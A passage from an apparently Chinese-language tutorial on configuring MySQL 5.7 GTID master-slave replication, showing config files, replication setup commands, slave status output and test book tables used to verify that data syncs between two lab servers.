Commands end with ; or \g.Your MySQL connection id is 5Server version: 5.7.24 MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; grant replication slave on *.* to &apos;Jaking&apos;@&apos;192.168.10.%&apos; identified by &apos;Jaking@vip.163.com&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; exitBye</code></pre><p><strong>&#x914D;&#x7F6E;&#x4E3B;&#x5E93;&#x6587;&#x4EF6;</strong></p><pre><code class="xml">[root@server11 ~]# vim /etc/my.cnf[mysqld]port=3306datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockskip-name-resolvesymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidskip-name-resolvelog-bin=mysql-bin                        // &#x5F00;&#x542F;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;server-id=11                             // &#x670D;&#x52A1;&#x5668;ID&#xFF0C;&#x5FC5;&#x987B;&#x552F;&#x4E00;gtid-mode=on                             #&#x5F00;&#x542F;gtid&#x6A21;&#x5F0F;enforce-gtid-consistency=on       //&#x5F3A;&#x5236;gtid&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5F00;&#x542F;&#x540E;&#x5BF9;&#x7279;&#x5B9A;&#x7684;create table&#x4E0D;&#x652F;&#x6301;binlog-format=row                       //&#x9ED8;&#x8BA4;&#x4E3A;mixed&#x6DF7;&#x5408;&#x6A21;&#x5F0F;&#xFF0C;&#x66F4;&#x6539;&#x6210;row&#x590D;&#x5236;&#xFF0C;&#x4E3A;&#x4E86;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;log-slave-updates=1                    //&#x4ECE;&#x5E93;binlog&#x8BB0;&#x5F55;&#x4E3B;&#x5E93;&#x540C;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;skip-slave-start=1                         //&#x8DF3;&#x8FC7;slave&#x590D;&#x5236;&#x7EBF;&#x7A0B;</code></pre><pre><code class="xml">[root@server11 ~]# systemctl restart mysqld[root@server11 ~]# systemctl status mysqld &#x25CF; mysqld.service - MySQL Server   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)   Active: active (running) since Fri 2022-04-22 05:28:12 EDT; 6s ago     Docs: man:mysqld(8)           http://dev.mysql.com/doc/refman/en/using-systemd.html  Process: 11752 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS)  Process: 11730 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS) Main PID: 11755 (mysqld)    Tasks: 27   CGroup: /system.slice/mysqld.service           &#x2514;&#x2500;11755 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld...Apr 22 05:28:11 server11 systemd[1]: Stopped MySQL Server.Apr 22 05:28:11 server11 systemd[1]: Starting MySQL Server...Apr 22 05:28:12 server11 systemd[1]: Started MySQL Server.</code></pre><p><strong>&#x67E5;&#x770B;GTID&#x6A21;&#x5F0F;&#x72B6;&#x6001;</strong></p><pre><code class="xml">[root@server11 ~]# mysql -uroot -pJaking@vip.163.com -e &apos;show variables like &quot;%GTID%&quot;;&apos;mysql: [Warning] Using a password on the command line interface can be insecure.+----------------------------------+-----------+| Variable_name                    | Value     |+----------------------------------+-----------+| binlog_gtid_simple_recovery      | ON        || enforce_gtid_consistency         | ON        || gtid_executed_compression_period | 1000      || gtid_mode                        | ON        || gtid_next                        | AUTOMATIC || gtid_owned                       |           || gtid_purged                      |           || session_track_gtids              | OFF       |+----------------------------------+-----------+</code></pre><p><strong>&#x914D;&#x7F6E;&#x4ECE;&#x5E93;&#x6587;&#x4EF6;</strong></p><pre><code class="xml">[root@server12 ~]# vim /etc/my.cnf[mysqld]port=3306datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidskip-name-resolvelog-bin=mysql-binserver-id=12gtid-mode=on  enforce-gtid-consistency=on          binlog-format=rowlog-slave-updates=1skip-slave-start=1[root@server12 ~]# systemctl restart mysqld[root@server12 ~]# systemctl status mysqld &#x25CF; mysqld.service - MySQL Server   Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled)   Active: active (running) since Fri 2022-04-22 18:08:39 CST; 8s ago     Docs: man:mysqld(8)           http://dev.mysql.com/doc/refman/en/using-systemd.html  Process: 2749 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS)  Process: 2731 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS) Main PID: 2753 (mysqld)   CGroup: /system.slice/mysqld.service           &#x2514;&#x2500;2753 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/...Apr 22 18:08:38 server12 systemd[1]: Starting MySQL Server...Apr 22 18:08:39 server12 systemd[1]: Started MySQL Server.</code></pre><p><strong>&#x67E5;&#x770B;GTID&#x6A21;&#x5F0F;&#x72B6;&#x6001;</strong></p><pre><code class="xml">[root@server12 ~]# mysql -uroot -pJaking@vip.163.com -e &apos;show variables like &quot;%GTID%&quot;;&apos;mysql: [Warning] Using a password on the command line interface can be insecure.+----------------------------------+-----------+| Variable_name                    | Value     |+----------------------------------+-----------+| binlog_gtid_simple_recovery      | ON        || enforce_gtid_consistency         | ON        || gtid_executed_compression_period | 1000      || gtid_mode                        | ON        || gtid_next                        | AUTOMATIC || gtid_owned                       |           || gtid_purged                      |           || session_track_gtids              | OFF       |+----------------------------------+-----------+</code></pre><p><strong>&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</strong></p><pre><code class="sql">[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; change master to     master_host=&apos;192.168.10.11&apos;,     master_user=&apos;Jaking&apos;,     master_password=&apos;Jaking@vip.163.com&apos;,     master_auto_position=1;Query OK, 0 rows affected, 2 warnings (0.01 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.10.11                  Master_User: Jaking                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin.000002          Read_Master_Log_Pos: 154               Relay_Log_File: server12-relay-bin.000002                Relay_Log_Pos: 367        Relay_Master_Log_File: mysql-bin.000002             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:           Replicate_Ignore_DB:            Replicate_Do_Table:        Replicate_Ignore_Table:       Replicate_Wild_Do_Table:   Replicate_Wild_Ignore_Table:                    Last_Errno: 0                   Last_Error:                  Skip_Counter: 0          Exec_Master_Log_Pos: 154              Relay_Log_Space: 577              Until_Condition: None               Until_Log_File:                 Until_Log_Pos: 0           Master_SSL_Allowed: No           Master_SSL_CA_File:            Master_SSL_CA_Path:               Master_SSL_Cert:             Master_SSL_Cipher:                Master_SSL_Key:         Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No                Last_IO_Errno: 0                Last_IO_Error:                Last_SQL_Errno: 0               Last_SQL_Error:   Replicate_Ignore_Server_Ids:              Master_Server_Id: 11                  Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates           Master_Retry_Count: 86400                  Master_Bind:       Last_IO_Error_Timestamp:      Last_SQL_Error_Timestamp:                Master_SSL_Crl:            Master_SSL_Crlpath:            Retrieved_Gtid_Set:             Executed_Gtid_Set:                 Auto_Position: 1         Replicate_Rewrite_DB:                  Channel_Name:            Master_TLS_Version: 1 row in set (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x5E93;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x5426;&#x540C;&#x6B65;</p><p>&#x67E5;&#x770B;&#x4E3B;&#x5E93;</p><pre><code class="sql">[root@server11 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 5Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x4ECE;&#x5E93;</p><pre><code class="sql">[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 6Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)</code></pre><h2 id="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"><a href="#&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;" class="headerlink" title="&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;"></a>&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</h2><p>&#x5728;&#x4E3B;&#x5E93;&#x6267;&#x884C;&#x4EE5;&#x4E0B;SQL&#x8BED;&#x53E5;</p><pre><code class="sql">CREATE DATABASE BOOK;USE BOOK;CREATE TABLE book (name char(66),price int,pages int);INSERT INTO book(name,price,pages) VALUES(&apos;Linux&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO book(name,price,pages) VALUES(&apos;Cloud Computing&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO book(name,price,pages) VALUES(&apos;Operation System&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO book(name,price,pages) VALUES(&apos;Artificial Intelligence&apos;,&apos;166&apos;,&apos;666&apos;);select * from book;------------------------------------------------------------------------------------mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; select * from BOOK.book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)</code></pre><p>&#x5728;&#x4ECE;&#x5E93;&#x67E5;&#x770B;&#x6570;&#x636E;&#x662F;&#x5426;&#x540C;&#x6B65;&#x8FC7;&#x6765;</p><pre><code class="sql">mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; select * from BOOK.book;+-------------------------+-------+-------+| name                    | price | pages |+-------------------------+-------+-------+| Linux                   |    30 |   666 || Cloud Computing         |    60 |   666 || Operation System        |    80 |   666 || Artificial Intelligence |   166 |   666 |+-------------------------+-------+-------+4 rows in set (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x72B6;&#x6001;</p><pre><code class="sql">mysql&gt; show master status;+------------------+----------+--------------+------------------+------------------------------------------+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                        |+------------------+----------+--------------+------------------+------------------------------------------+| mysql-bin.000002 |     1620 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |+------------------+----------+--------------+------------------+------------------------------------------+1 row in set (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x4ECE;&#x5E93;&#x72B6;&#x6001;</p><pre><code class="sql">mysql&gt; show master status;+------------------+----------+--------------+------------------+------------------------------------------+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                        |+------------------+----------+--------------+------------------+------------------------------------------+| mysql-bin.000002 |     1584 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |+------------------+----------+--------------+------------------+------------------------------------------+1 row in set (0.00 sec)</code></pre><p>&#x4ECE;&#x5E93;&#x505C;&#x6389;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</p><pre><code class="sql">mysql&gt; stop slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State:                   Master_Host: 192.168.10.11                  Master_User: Jaking                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin.000002          Read_Master_Log_Pos: 1620               Relay_Log_File: server12-relay-bin.000002                Relay_Log_Pos: 1833        Relay_Master_Log_File: mysql-bin.000002             Slave_IO_Running: No            Slave_SQL_Running: No              Replicate_Do_DB:           Replicate_Ignore_DB:            Replicate_Do_Table:        Replicate_Ignore_Table:       Replicate_Wild_Do_Table:   Replicate_Wild_Ignore_Table:                    Last_Errno: 0                   Last_Error:                  Skip_Counter: 0          Exec_Master_Log_Pos: 1620              Relay_Log_Space: 2043              Until_Condition: None               Until_Log_File:                 Until_Log_Pos: 0           Master_SSL_Allowed: No           Master_SSL_CA_File:            Master_SSL_CA_Path:               Master_SSL_Cert:             Master_SSL_Cipher:                Master_SSL_Key:         Seconds_Behind_Master: NULLMaster_SSL_Verify_Server_Cert: No                Last_IO_Errno: 0                Last_IO_Error:                Last_SQL_Errno: 0               Last_SQL_Error:   Replicate_Ignore_Server_Ids:              Master_Server_Id: 11                  Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State:            Master_Retry_Count: 86400                  Master_Bind:       Last_IO_Error_Timestamp:      Last_SQL_Error_Timestamp:                Master_SSL_Crl:            Master_SSL_Crlpath:            Retrieved_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6            Executed_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6                Auto_Position: 1         Replicate_Rewrite_DB:                  Channel_Name:            Master_TLS_Version: 1 row in set (0.00 sec)</code></pre><p>&#x5728;&#x4E3B;&#x5E93;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x540E;&#x4ECE;&#x5E93;&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x67E5;&#x770B;&#x662F;&#x5426;&#x540C;&#x6B65;</p><pre><code class="sql">CREATE DATABASE `testbookdb` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;show databases;use testbookdb;CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;,&apos;68&apos;,&apos;&#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;,&apos;90&apos;,&apos;&#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;,&apos;71&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;&apos;,&apos;72&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;&apos;,&apos;73&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;&apos;,&apos;74&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;&apos;,&apos;75&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;&apos;,&apos;76&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;&apos;,&apos;77&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;&apos;,&apos;78&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;&apos;,&apos;79&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);CREATE TABLE book2 (name char(16),price int,pages int);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;,&apos;166&apos;,&apos;666&apos;);show tables;select * from book1;select * from book2;</code></pre><pre><code class="sql">mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName                             | price | publishing            |+---------+-----------------------------------+-------+-----------------------+|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        ||       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name                              | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x72B6;&#x6001;</p><pre><code class="sql">mysql&gt; show master status;+------------------+----------+--------------+------------------+-------------------------------------------+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                         |+------------------+----------+--------------+------------------+-------------------------------------------+| mysql-bin.000002 |     7389 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 |+------------------+----------+--------------+------------------+-------------------------------------------+1 row in set (0.00 sec)</code></pre><p>&#x67E5;&#x770B;&#x4ECE;&#x5E93;&#x72B6;&#x6001;</p><pre><code class="sql">mysql&gt; show master status;+------------------+----------+--------------+------------------+------------------------------------------+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                        |+------------------+----------+--------------+------------------+------------------------------------------+| mysql-bin.000002 |     1584 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |+------------------+----------+--------------+------------------+------------------------------------------+1 row in set (0.00 sec)</code></pre><p>&#x4ECE;&#x5E93;&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x67E5;&#x770B;&#x662F;&#x5426;&#x540C;&#x6B65;</p><pre><code class="sql">mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.10.11                  Master_User: Jaking                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin.000002          Read_Master_Log_Pos: 7389               Relay_Log_File: server12-relay-bin.000003                Relay_Log_Pos: 6223        Relay_Master_Log_File: mysql-bin.000002             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:           Replicate_Ignore_DB:            Replicate_Do_Table:        Replicate_Ignore_Table:       Replicate_Wild_Do_Table:   Replicate_Wild_Ignore_Table:                    Last_Errno: 0                   Last_Error:                  Skip_Counter: 0          Exec_Master_Log_Pos: 7389              Relay_Log_Space: 8112              Until_Condition: None               Until_Log_File:                 Until_Log_Pos: 0           Master_SSL_Allowed: No           Master_SSL_CA_File:            Master_SSL_CA_Path:               Master_SSL_Cert:             Master_SSL_Cipher:                Master_SSL_Key:         Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No                Last_IO_Errno: 0                Last_IO_Error:                Last_SQL_Errno: 0               Last_SQL_Error:   Replicate_Ignore_Server_Ids:              Master_Server_Id: 11                  Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6             Master_Info_File: /var/lib/mysql/master.info                    SQL_Delay: 0          SQL_Remaining_Delay: NULL      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates           Master_Retry_Count: 86400                  Master_Bind:       Last_IO_Error_Timestamp:      Last_SQL_Error_Timestamp:                Master_SSL_Crl:            Master_SSL_Crlpath:            Retrieved_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25            Executed_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25                Auto_Position: 1         Replicate_Rewrite_DB:                  Channel_Name:            Master_TLS_Version: 1 row in set (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || BOOK               || mysql              || performance_schema || sys                || testbookdb         |+--------------------+6 rows in set (0.00 sec)mysql&gt; use testbookdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+----------------------+| Tables_in_testbookdb |+----------------------+| book1                || book2                |+----------------------+2 rows in set (0.00 sec)mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName                             | price | publishing            |+---------+-----------------------------------+-------+-----------------------+|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        ||       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        ||       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      10 | 